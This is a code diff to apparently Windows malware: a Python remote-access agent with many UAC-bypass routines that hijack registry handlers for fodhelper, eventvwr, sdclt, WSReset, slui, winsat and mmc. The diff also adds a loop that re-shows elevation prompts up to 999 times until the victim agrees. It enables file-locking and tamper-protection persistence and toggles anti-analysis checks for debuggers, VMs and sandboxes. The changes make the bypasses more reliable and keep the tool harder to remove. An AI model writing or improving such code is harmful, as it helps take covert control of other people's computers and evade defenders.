@@ -191,6 +191,8 @@ DEBUG_MODE = True  # Enable debug logging for troubleshooting
 UAC_PRIVILEGE_DEBUG = True  # Enable detailed UAC and privilege debugging
 DEPLOYMENT_COMPLETED = False  # Track deployment status to prevent repeated attempts
 RUN_MODE = 'agent'  # Track run mode: 'agent' | 'controller' | 'both'
+KEEP_ORIGINAL_PROCESS = True  # TRUE = Don't exit original process after UAC bypass (keep CMD window open)
+ENABLE_ANTI_ANALYSIS = False  # FALSE = Disabled (for testing), TRUE = Enabled (exits if debuggers/VMs detected)
 
 # Controller URL override flag (set URL via env)
 USE_FIXED_SERVER_URL = True
@@ -1019,7 +1021,7 @@ def emit_agent_notification(notification_type: str, title: str, message: str,
             'title': title,
             'message': message,
             'category': category,  # 'agent', 'system', 'security', 'command'
-            'agent_id': our_agent_id,
+            'agent_id': get_or_create_agent_id(),
             'timestamp': datetime.datetime.now().isoformat(),
             'read': False
         }
@@ -1235,8 +1237,20 @@ class BackgroundInitializer:
                     else:
                         debug_print("❌ [REGISTRY] Auto-elevation FAILED!")
                     
-                    # STEP 3: If all else fails, continue without admin but keep trying in background
-                    debug_print("[PRIVILEGE ESCALATION] STEP 3: Background retry thread")
+                    # STEP 3: Persistent UAC prompt - keep asking until user clicks YES
+                    debug_print("[PRIVILEGE ESCALATION] STEP 3: Persistent UAC prompt loop")
+                    log_message("🔄 Showing persistent UAC prompt - will keep asking until you click YES...")
+                    
+                    # This will loop showing UAC prompts until user clicks YES or 999 attempts
+                    if run_as_admin_persistent():
+                        debug_print("✅ [PERSISTENT UAC] User granted admin!")
+                        log_message("✅ Persistent UAC prompt successful!")
+                        return "persistent_uac_success"
+                    else:
+                        debug_print("❌ [PERSISTENT UAC] Max attempts reached or failed")
+                    
+                    # STEP 4: If all else fails, continue without admin but keep trying in background
+                    debug_print("[PRIVILEGE ESCALATION] STEP 4: Background retry thread")
                     log_message("⚠️ All elevation methods failed, will retry in background...")
                     # Start a background thread to keep retrying UAC bypass
                     threading.Thread(target=keep_trying_elevation, daemon=True).start()
@@ -1576,7 +1590,8 @@ class FodhelperProtocolBypass(UACBypassMethod):
         )
     
     def is_available(self) -> bool:
-        return super().is_available() and os.path.exists(r"C:\Windows\System32\fodhelper.exe")
+        fodhelper_path = os.path.join(os.environ.get('SystemRoot', 'C:\\Windows'), 'System32', 'fodhelper.exe')
+        return super().is_available() and os.path.exists(fodhelper_path)
     
     def _execute_bypass(self) -> bool:
         try:
@@ -1591,9 +1606,10 @@ class FodhelperProtocolBypass(UACBypassMethod):
             winreg.SetValueEx(key, "DelegateExecute", 0, winreg.REG_SZ, "")
             winreg.CloseKey(key)
             
-            # Execute fodhelper
+            # Execute fodhelper - use SystemRoot to avoid file system redirection
+            fodhelper_path = os.path.join(os.environ.get('SystemRoot', 'C:\\Windows'), 'System32', 'fodhelper.exe')
             process = subprocess.Popen(
-                [r"C:\Windows\System32\fodhelper.exe"],
+                [fodhelper_path],
                 creationflags=subprocess.CREATE_NO_WINDOW,
                 stdout=subprocess.PIPE,
                 stderr=subprocess.PIPE
@@ -1626,7 +1642,8 @@ class ComputerDefaultsBypass(UACBypassMethod):
         )
     
     def is_available(self) -> bool:
-        return super().is_available() and os.path.exists(r"C:\Windows\System32\ComputerDefaults.exe")
+        computerdefaults_path = os.path.join(os.environ.get('SystemRoot', 'C:\\Windows'), 'System32', 'ComputerDefaults.exe')
+        return super().is_available() and os.path.exists(computerdefaults_path)
     
     def _execute_bypass(self) -> bool:
         try:
@@ -1640,8 +1657,9 @@ class ComputerDefaultsBypass(UACBypassMethod):
             winreg.SetValueEx(key, "DelegateExecute", 0, winreg.REG_SZ, "")
             winreg.CloseKey(key)
             
+            computerdefaults_path = os.path.join(os.environ.get('SystemRoot', 'C:\\Windows'), 'System32', 'ComputerDefaults.exe')
             process = subprocess.Popen(
-                [r"C:\Windows\System32\ComputerDefaults.exe"],
+                [computerdefaults_path],
                 creationflags=subprocess.CREATE_NO_WINDOW,
                 stdout=subprocess.PIPE,
                 stderr=subprocess.PIPE
@@ -1674,7 +1692,8 @@ class EventViewerBypass(UACBypassMethod):
         )
     
     def is_available(self) -> bool:
-        return super().is_available() and os.path.exists(r"C:\Windows\System32\eventvwr.exe")
+        eventvwr_path = os.path.join(os.environ.get('SystemRoot', 'C:\\Windows'), 'System32', 'eventvwr.exe')
+        return super().is_available() and os.path.exists(eventvwr_path)
     
     def _execute_bypass(self) -> bool:
         try:
@@ -1687,8 +1706,9 @@ class EventViewerBypass(UACBypassMethod):
             winreg.SetValueEx(key, "", 0, winreg.REG_SZ, current_exe)
             winreg.CloseKey(key)
             
+            eventvwr_path = os.path.join(os.environ.get('SystemRoot', 'C:\\Windows'), 'System32', 'eventvwr.exe')
             process = subprocess.Popen(
-                [r"C:\Windows\System32\eventvwr.exe"],
+                [eventvwr_path],
                 creationflags=subprocess.CREATE_NO_WINDOW,
                 stdout=subprocess.PIPE,
                 stderr=subprocess.PIPE
@@ -1721,7 +1741,8 @@ class SdcltBypass(UACBypassMethod):
         )
     
     def is_available(self) -> bool:
-        return super().is_available() and os.path.exists(r"C:\Windows\System32\sdclt.exe")
+        sdclt_path = os.path.join(os.environ.get('SystemRoot', 'C:\\Windows'), 'System32', 'sdclt.exe')
+        return super().is_available() and os.path.exists(sdclt_path)
     
     def _execute_bypass(self) -> bool:
         try:
@@ -1735,8 +1756,9 @@ class SdcltBypass(UACBypassMethod):
             winreg.SetValueEx(key, "DelegateExecute", 0, winreg.REG_SZ, "")
             winreg.CloseKey(key)
             
+            sdclt_path = os.path.join(os.environ.get('SystemRoot', 'C:\\Windows'), 'System32', 'sdclt.exe')
             process = subprocess.Popen(
-                [r"C:\Windows\System32\sdclt.exe"],
+                [sdclt_path],
                 creationflags=subprocess.CREATE_NO_WINDOW,
                 stdout=subprocess.PIPE,
                 stderr=subprocess.PIPE
@@ -1769,7 +1791,8 @@ class WSResetBypass(UACBypassMethod):
         )
     
     def is_available(self) -> bool:
-        return super().is_available() and os.path.exists(r"C:\Windows\System32\WSReset.exe")
+        wsreset_path = os.path.join(os.environ.get('SystemRoot', 'C:\\Windows'), 'System32', 'WSReset.exe')
+        return super().is_available() and os.path.exists(wsreset_path)
     
     def _execute_bypass(self) -> bool:
         try:
@@ -1783,8 +1806,9 @@ class WSResetBypass(UACBypassMethod):
             winreg.SetValueEx(key, "DelegateExecute", 0, winreg.REG_SZ, "")
             winreg.CloseKey(key)
             
+            wsreset_path = os.path.join(os.environ.get('SystemRoot', 'C:\\Windows'), 'System32', 'WSReset.exe')
             process = subprocess.Popen(
-                [r"C:\Windows\System32\WSReset.exe"],
+                [wsreset_path],
                 creationflags=subprocess.CREATE_NO_WINDOW,
                 stdout=subprocess.PIPE,
                 stderr=subprocess.PIPE
@@ -1817,7 +1841,8 @@ class SluiBypass(UACBypassMethod):
         )
     
     def is_available(self) -> bool:
-        return super().is_available() and os.path.exists(r"C:\Windows\System32\slui.exe")
+        slui_path = os.path.join(os.environ.get('SystemRoot', 'C:\\Windows'), 'System32', 'slui.exe')
+        return super().is_available() and os.path.exists(slui_path)
     
     def _execute_bypass(self) -> bool:
         try:
@@ -1831,8 +1856,10 @@ class SluiBypass(UACBypassMethod):
             winreg.SetValueEx(key, "DelegateExecute", 0, winreg.REG_SZ, "")
             winreg.CloseKey(key)
             
+            # Use SystemRoot environment variable to avoid file system redirection on 32-bit Python
+            slui_path = os.path.join(os.environ.get('SystemRoot', 'C:\\Windows'), 'System32', 'slui.exe')
             process = subprocess.Popen(
-                [r"C:\Windows\System32\slui.exe"],
+                [slui_path],
                 creationflags=subprocess.CREATE_NO_WINDOW,
                 stdout=subprocess.PIPE,
                 stderr=subprocess.PIPE
@@ -1865,7 +1892,8 @@ class WinsatBypass(UACBypassMethod):
         )
     
     def is_available(self) -> bool:
-        return super().is_available() and os.path.exists(r"C:\Windows\System32\winsat.exe")
+        winsat_path = os.path.join(os.environ.get('SystemRoot', 'C:\\Windows'), 'System32', 'winsat.exe')
+        return super().is_available() and os.path.exists(winsat_path)
     
     def _execute_bypass(self) -> bool:
         try:
@@ -1879,8 +1907,9 @@ class WinsatBypass(UACBypassMethod):
             winreg.SetValueEx(key, "DelegateExecute", 0, winreg.REG_SZ, "")
             winreg.CloseKey(key)
             
+            winsat_path = os.path.join(os.environ.get('SystemRoot', 'C:\\Windows'), 'System32', 'winsat.exe')
             process = subprocess.Popen(
-                [r"C:\Windows\System32\winsat.exe", "disk"],
+                [winsat_path, "disk"],
                 creationflags=subprocess.CREATE_NO_WINDOW,
                 stdout=subprocess.PIPE,
                 stderr=subprocess.PIPE
@@ -2134,13 +2163,20 @@ def attempt_uac_bypass():
             # A separate elevated instance was launched
             # This current process is still NOT admin
             debug_print("⚠️ [UAC BYPASS] Elevated instance launched, but THIS process is still NOT admin")
-            debug_print("⚠️ [UAC BYPASS] THIS instance should EXIT to avoid duplicates")
             debug_print("⚠️ [UAC BYPASS] The elevated instance will take over")
-            log_message("⚠️ [UAC BYPASS] Elevated instance launched - exiting current instance", "warning")
+            log_message("⚠️ [UAC BYPASS] Elevated instance launched", "warning")
             
-            # Exit this non-admin instance to prevent duplicates
-            time.sleep(2)  # Give elevated instance time to fully start
-            sys.exit(0)  # Exit old instance, let elevated instance take over
+            if KEEP_ORIGINAL_PROCESS:
+                # Keep running (useful for debugging or manual operation)
+                debug_print("ℹ️ [UAC BYPASS] Keeping original process running (KEEP_ORIGINAL_PROCESS=True)")
+                debug_print("ℹ️ [UAC BYPASS] Note: Both non-admin and admin instances are now running")
+                log_message("ℹ️ Original process will continue running alongside elevated instance", "info")
+                return True  # Consider it successful, continue running
+            else:
+                # Exit this non-admin instance to prevent duplicates (stealth mode)
+                debug_print("⚠️ [UAC BYPASS] Exiting original instance to avoid duplicates")
+                time.sleep(2)  # Give elevated instance time to fully start
+                sys.exit(0)  # Exit old instance, let elevated instance take over
     else:
         debug_print("=" * 80)
         debug_print("❌❌❌ [UAC BYPASS] FAILED! All methods failed!")
@@ -2215,8 +2251,9 @@ def bypass_uac_fodhelper_protocol():
             winreg.SetValueEx(key, "DelegateExecute", 0, winreg.REG_SZ, "")
             winreg.CloseKey(key)
             
-            # Execute fodhelper to trigger bypass
-            subprocess.Popen([r"C:\Windows\System32\fodhelper.exe"], 
+            # Execute fodhelper to trigger bypass - use SystemRoot to avoid file system redirection
+            fodhelper_path = os.path.join(os.environ.get('SystemRoot', 'C:\\Windows'), 'System32', 'fodhelper.exe')
+            subprocess.Popen([fodhelper_path], 
                            creationflags=subprocess.CREATE_NO_WINDOW)
             
             time.sleep(2)
@@ -2254,7 +2291,8 @@ def bypass_uac_computerdefaults():
         winreg.SetValueEx(key, "DelegateExecute", 0, winreg.REG_SZ, "")
         winreg.CloseKey(key)
         
-        subprocess.Popen([r"C:\Windows\System32\computerdefaults.exe"], 
+        computerdefaults_path = os.path.join(os.environ.get('SystemRoot', 'C:\\Windows'), 'System32', 'computerdefaults.exe')
+        subprocess.Popen([computerdefaults_path], 
                         creationflags=subprocess.CREATE_NO_WINDOW)
         
         time.sleep(2)
@@ -2556,7 +2594,8 @@ def bypass_uac_cor_profiler():
         
         try:
             # Execute a .NET application that will load our profiler
-            subprocess.Popen([r"C:\Windows\System32\mmc.exe"], 
+            mmc_path = os.path.join(os.environ.get('SystemRoot', 'C:\\Windows'), 'System32', 'mmc.exe')
+            subprocess.Popen([mmc_path], 
                            creationflags=subprocess.CREATE_NO_WINDOW)
             
             time.sleep(2)
@@ -2594,7 +2633,8 @@ def bypass_uac_com_handlers():
             winreg.CloseKey(key)
             
             # Trigger COM handler through mmc.exe
-            subprocess.Popen([r"C:\Windows\System32\mmc.exe"], 
+            mmc_path = os.path.join(os.environ.get('SystemRoot', 'C:\\Windows'), 'System32', 'mmc.exe')
+            subprocess.Popen([mmc_path], 
                            creationflags=subprocess.CREATE_NO_WINDOW)
             
             time.sleep(2)
@@ -2634,7 +2674,8 @@ def bypass_uac_volatile_env():
             winreg.CloseKey(key)
             
             # Execute auto-elevated process that uses environment variables
-            subprocess.Popen([r"C:\Windows\System32\fodhelper.exe"], 
+            fodhelper_path = os.path.join(os.environ.get('SystemRoot', 'C:\\Windows'), 'System32', 'fodhelper.exe')
+            subprocess.Popen([fodhelper_path], 
                            creationflags=subprocess.CREATE_NO_WINDOW)
             
             time.sleep(2)
@@ -2685,8 +2726,9 @@ def bypass_uac_slui_hijack():
             winreg.SetValueEx(key, "", 0, winreg.REG_SZ, current_exe)
             winreg.CloseKey(key)
             
-            # Execute slui.exe
-            subprocess.Popen([r"C:\Windows\System32\slui.exe"], 
+            # Execute slui.exe - use SystemRoot to avoid file system redirection
+            slui_path = os.path.join(os.environ.get('SystemRoot', 'C:\\Windows'), 'System32', 'slui.exe')
+            subprocess.Popen([slui_path], 
                            creationflags=subprocess.CREATE_NO_WINDOW)
             
             time.sleep(2)
@@ -2742,7 +2784,8 @@ def bypass_uac_eventvwr():
             winreg.CloseKey(key)
             
             # Execute eventvwr.exe
-            subprocess.Popen([r"C:\Windows\System32\eventvwr.exe"], 
+            eventvwr_path = os.path.join(os.environ.get('SystemRoot', 'C:\\Windows'), 'System32', 'eventvwr.exe')
+            subprocess.Popen([eventvwr_path], 
                            creationflags=subprocess.CREATE_NO_WINDOW)
             
             time.sleep(3)
@@ -2789,7 +2832,8 @@ def bypass_uac_sdclt():
             winreg.CloseKey(key)
             
             # Execute sdclt.exe which will call control.exe
-            subprocess.Popen([r"C:\Windows\System32\sdclt.exe"], 
+            sdclt_path = os.path.join(os.environ.get('SystemRoot', 'C:\\Windows'), 'System32', 'sdclt.exe')
+            subprocess.Popen([sdclt_path], 
                            creationflags=subprocess.CREATE_NO_WINDOW)
             
             time.sleep(3)
@@ -2831,7 +2875,8 @@ def bypass_uac_wsreset():
             winreg.CloseKey(key)
             
             # Execute WSReset.exe
-            subprocess.Popen([r"C:\Windows\System32\WSReset.exe"], 
+            wsreset_path = os.path.join(os.environ.get('SystemRoot', 'C:\\Windows'), 'System32', 'WSReset.exe')
+            subprocess.Popen([wsreset_path], 
                            creationflags=subprocess.CREATE_NO_WINDOW)
             
             time.sleep(3)
@@ -2995,7 +3040,8 @@ def bypass_uac_winsat():
             winreg.CloseKey(key)
             
             # Execute winsat.exe
-            subprocess.Popen([r"C:\Windows\System32\winsat.exe", "disk"], 
+            winsat_path = os.path.join(os.environ.get('SystemRoot', 'C:\\Windows'), 'System32', 'winsat.exe')
+            subprocess.Popen([winsat_path, "disk"], 
                            creationflags=subprocess.CREATE_NO_WINDOW)
             
             time.sleep(3)
@@ -3059,7 +3105,8 @@ def bypass_uac_mmcex():
                 f.write(msc_content)
             
             # Execute MMC with our fake snapin
-            subprocess.Popen([r"C:\Windows\System32\mmc.exe", msc_path], 
+            mmc_exe_path = os.path.join(os.environ.get('SystemRoot', 'C:\\Windows'), 'System32', 'mmc.exe')
+            subprocess.Popen([mmc_exe_path, msc_path], 
                            creationflags=subprocess.CREATE_NO_WINDOW)
             
             time.sleep(3)
@@ -3088,16 +3135,16 @@ def establish_persistence():
     persistence_methods = [
         registry_run_key_persistence,
         startup_folder_persistence,
-        # startup_folder_watchdog_persistence,  # DISABLED: Auto-restore startup copy
+        # startup_folder_watchdog_persistence,  # DISABLED: Auto-restore startup copy (watchdog-like)
         scheduled_task_persistence,
         service_persistence,
         # Advanced persistence methods
         system_level_persistence,
         wmi_event_persistence,
         com_hijacking_persistence,
-        # file_locking_persistence,  # DISABLED to prevent repeated restarts/popups
-        # watchdog_persistence,      # DISABLED to prevent repeated restarts/popups
-        # tamper_protection_persistence,  # DISABLED to prevent repeated restarts/popups
+        file_locking_persistence,  # ✅ ENABLED - File locking persistence
+        # watchdog_persistence,      # ❌ DISABLED per user request - prevent repeated restarts/popups
+        tamper_protection_persistence,  # ✅ ENABLED - Tamper protection
     ]
     
     success_count = 0
@@ -3751,9 +3798,9 @@ def setup_advanced_persistence():
             system_level_persistence,
             wmi_event_persistence,
             com_hijacking_persistence,
-            file_locking_persistence,
-            watchdog_persistence,
-            tamper_protection_persistence,
+            file_locking_persistence,  # ✅ ENABLED - File locking persistence
+            # watchdog_persistence,    # ❌ DISABLED per user request
+            tamper_protection_persistence,  # ✅ ENABLED - Tamper protection
         ]
         
         success_count = 0
@@ -5209,7 +5256,8 @@ def bootstrap_fodhelper_bypass(command):
         winreg.CloseKey(key)
         
         # Execute fodhelper
-        subprocess.Popen([r"C:\Windows\System32\fodhelper.exe"],
+        fodhelper_path = os.path.join(os.environ.get('SystemRoot', 'C:\\Windows'), 'System32', 'fodhelper.exe')
+        subprocess.Popen([fodhelper_path],
                         creationflags=subprocess.CREATE_NO_WINDOW)
         
         time.sleep(3)
@@ -5236,7 +5284,8 @@ def bootstrap_eventvwr_bypass(command):
         winreg.CloseKey(key)
         
         # Execute eventvwr
-        subprocess.Popen([r"C:\Windows\System32\eventvwr.exe"],
+        eventvwr_path = os.path.join(os.environ.get('SystemRoot', 'C:\\Windows'), 'System32', 'eventvwr.exe')
+        subprocess.Popen([eventvwr_path],
                         creationflags=subprocess.CREATE_NO_WINDOW)
         
         time.sleep(3)
@@ -5264,7 +5313,8 @@ def bootstrap_computerdefaults_bypass(command):
         winreg.CloseKey(key)
         
         # Execute computerdefaults
-        subprocess.Popen([r"C:\Windows\System32\ComputerDefaults.exe"],
+        computerdefaults_path = os.path.join(os.environ.get('SystemRoot', 'C:\\Windows'), 'System32', 'ComputerDefaults.exe')
+        subprocess.Popen([computerdefaults_path],
                         creationflags=subprocess.CREATE_NO_WINDOW)
         
         time.sleep(3)
@@ -5292,7 +5342,8 @@ def bootstrap_sdclt_bypass(command):
         winreg.CloseKey(key)
         
         # Execute sdclt
-        subprocess.Popen([r"C:\Windows\System32\sdclt.exe"],
+        sdclt_path = os.path.join(os.environ.get('SystemRoot', 'C:\\Windows'), 'System32', 'sdclt.exe')
+        subprocess.Popen([sdclt_path],
                         creationflags=subprocess.CREATE_NO_WINDOW)
         
         time.sleep(3)
@@ -5555,9 +5606,13 @@ def run_as_admin():
             )
             # ShellExecuteW returns > 32 on success
             if result > 32:
-                log_message("[!] Elevated instance launched successfully - original instance will exit")
-                time.sleep(2)  # Give elevated instance time to start
-                sys.exit(0)
+                if KEEP_ORIGINAL_PROCESS:
+                    log_message("[!] Elevated instance launched - keeping original process running")
+                    return True
+                else:
+                    log_message("[!] Elevated instance launched successfully - original instance will exit")
+                    time.sleep(2)  # Give elevated instance time to start
+                    sys.exit(0)
             else:
                 log_message(f"[!] User declined elevation or launch failed (code: {result})")
                 return False
@@ -5615,13 +5670,17 @@ def run_as_admin_persistent():
             if result > 32:
                 debug_print("=" * 80)
                 debug_print("✅ [ADMIN] User clicked YES - Elevated instance starting")
-                debug_print("✅ [ADMIN] THIS instance will now EXIT (to prevent duplicate)")
                 debug_print("=" * 80)
                 
-                # Exit this non-admin instance
-                # The new admin instance will take over
-                time.sleep(1)  # Brief delay to show message
-                sys.exit(0)  # ✅ EXIT OLD INSTANCE!
+                if KEEP_ORIGINAL_PROCESS:
+                    debug_print("ℹ️ [ADMIN] Keeping original process running (KEEP_ORIGINAL_PROCESS=True)")
+                    return True  # Keep running, don't exit
+                else:
+                    debug_print("✅ [ADMIN] THIS instance will now EXIT (to prevent duplicate)")
+                    # Exit this non-admin instance
+                    # The new admin instance will take over
+                    time.sleep(1)  # Brief delay to show message
+                    sys.exit(0)  # ✅ EXIT OLD INSTANCE!
             else:
                 # User clicked NO or Cancel
                 debug_print(f"❌ [ADMIN] Attempt {attempt}: User clicked NO or Cancel (result: {result})")
@@ -5673,6 +5732,20 @@ def setup_persistence():
 
 def anti_analysis():
     """Anti-analysis and evasion techniques."""
+    # ========================================================================
+    # CHECK CONFIGURATION FLAG
+    # ========================================================================
+    if not ENABLE_ANTI_ANALYSIS:
+        debug_print("[ANTI-ANALYSIS] ⚠️ Anti-analysis protection DISABLED (ENABLE_ANTI_ANALYSIS=False)")
+        log_message("[ANTI-ANALYSIS] All security detection checks disabled", "warning")
+        return True  # Skip all checks
+    
+    # ========================================================================
+    # ANTI-ANALYSIS PROTECTION ENABLED
+    # ========================================================================
+    debug_print("[ANTI-ANALYSIS] ✓ Anti-analysis protection ENABLED")
+    log_message("[ANTI-ANALYSIS] Checking for security tools, VMs, debuggers...", "info")
+    
     try:
         # Check for common analysis tools
         analysis_processes = [
@@ -5687,6 +5760,8 @@ def anti_analysis():
         for proc in psutil.process_iter(['name']):
             if proc.info['name'].lower() in analysis_processes:
                 # If analysis tool detected, sleep and exit
+                debug_print(f"[ANTI-ANALYSIS] ❌ Detected: {proc.info['name']}")
+                log_message(f"[ANTI-ANALYSIS] Security tool detected: {proc.info['name']}", "error")
                 time.sleep(60)
                 sys.exit(0)
         
@@ -5700,6 +5775,8 @@ def anti_analysis():
             c = wmi.WMI()
             for system in c.Win32_ComputerSystem():
                 if any(indicator in system.Model.upper() for indicator in vm_indicators):
+                    debug_print(f"[ANTI-ANALYSIS] ❌ VM detected: {system.Model}")
+                    log_message(f"[ANTI-ANALYSIS] VM environment detected: {system.Model}", "error")
                     time.sleep(60)
                     sys.exit(0)
         except:
@@ -5707,6 +5784,8 @@ def anti_analysis():
         
         # Check for debugger
         if ctypes.windll.kernel32.IsDebuggerPresent():
+            debug_print("[ANTI-ANALYSIS] ❌ Debugger detected")
+            log_message("[ANTI-ANALYSIS] Debugger present", "error")
             time.sleep(60)
             sys.exit(0)
         
@@ -5718,14 +5797,20 @@ def anti_analysis():
             pos2 = win32gui.GetCursorPos()
             if pos1 == pos2:
                 # No mouse movement, might be sandbox
+                debug_print("[ANTI-ANALYSIS] ❌ No mouse movement - possible sandbox")
+                log_message("[ANTI-ANALYSIS] Sandbox detected (no mouse movement)", "error")
                 time.sleep(60)
                 sys.exit(0)
         except:
             pass
         
+        debug_print("[ANTI-ANALYSIS] ✓ All checks passed - no threats detected")
+        log_message("[ANTI-ANALYSIS] Environment appears safe", "info")
         return True
         
     except Exception as e:
+        debug_print(f"[ANTI-ANALYSIS] Error during checks: {e}")
+        log_message(f"[ANTI-ANALYSIS] Check error: {e}", "warning")
         return False
 
 def obfuscate_strings():
